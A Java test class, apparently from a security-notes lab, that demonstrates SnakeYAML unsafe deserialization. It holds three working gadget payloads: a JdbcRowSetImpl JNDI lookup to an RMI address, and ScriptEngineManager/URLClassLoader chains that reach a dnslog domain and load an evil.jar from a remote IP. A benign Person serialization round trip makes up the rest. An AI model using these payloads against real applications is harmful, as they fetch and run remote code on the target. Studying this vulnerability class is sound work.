package icu.secnotes.test;

import icu.secnotes.pojo.Person;
import org.yaml.snakeyaml.Yaml;

public class SnakeYAMLTest {
    public static void main(String[] args) throws Exception {

        Yaml yaml = new Yaml();
        // DnslogSnakeYamlTest(yaml);
        // EvilObjectSnakeYamlTest(yaml);
        // JNDISnakeYamlTest(yaml);
        ObjectSnakeYamlTest(yaml);

    }

    private static void JNDISnakeYamlTest(Yaml yaml) {

        String yamlStr = "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'rmi://150.109.15.229:9999/evilfile', autoCommit: true}";
        // 直接加载，不需要强制转换
        Object result = yaml.load(yamlStr);
        System.out.println("恶意payload执行结果: " + result);
        System.out.println("返回对象类型: " + result.getClass().getName());
        
    }

    private static void DnslogSnakeYamlTest(Yaml yaml) {

        String yamlStr = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[http://dddd.ed1rji.dnslog.cn]]]";
        // 直接加载，不需要强制转换
        Object result = yaml.load(yamlStr);
        System.out.println("恶意payload执行结果: " + result);
        System.out.println("返回对象类型: " + result.getClass().getName());
        
    }

    private static void EvilObjectSnakeYamlTest(Yaml yaml) throws Exception{
        // 使用JAR文件，.class恶意类加载会有问题
        String yamlStr = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[http://45.62.116.169:8080/evil.jar]]]";
        
        System.out.println("开始测试SnakeYAML反序列化漏洞（使用JAR文件）...");
        System.out.println("Payload: " + yamlStr);
        
        // 直接加载，不需要强制转换
        Object result = yaml.load(yamlStr);
        System.out.println("恶意payload执行结果: " + result);
        System.out.println("返回对象类型: " + result.getClass().getName());
        
    }

    private static void ObjectSnakeYamlTest(Yaml yaml) {
        // 创建Person实例
        Person person = new Person();
        person.setName("张三");
        person.setAge(25);
        
        System.out.println("原始Person对象: " + person);
        
        // 序列化Person对象为YAML字符串
        String yamlStr = yaml.dump(person);
        System.out.println("序列化结果:");
        System.out.println(yamlStr);
        
        // 反序列化YAML字符串为Person对象
        Person deserializedPerson = yaml.load(yamlStr);
        System.out.println("反序列化结果: " + deserializedPerson);
        System.out.println("反序列化的Person对象名：" + deserializedPerson.getName());
        
        // 验证序列化和反序列化是否成功
        System.out.println("序列化/反序列化测试: " + 
            (person.getName().equals(deserializedPerson.getName()) && 
             person.getAge().equals(deserializedPerson.getAge()) ? "成功" : "失败"));
    }
}
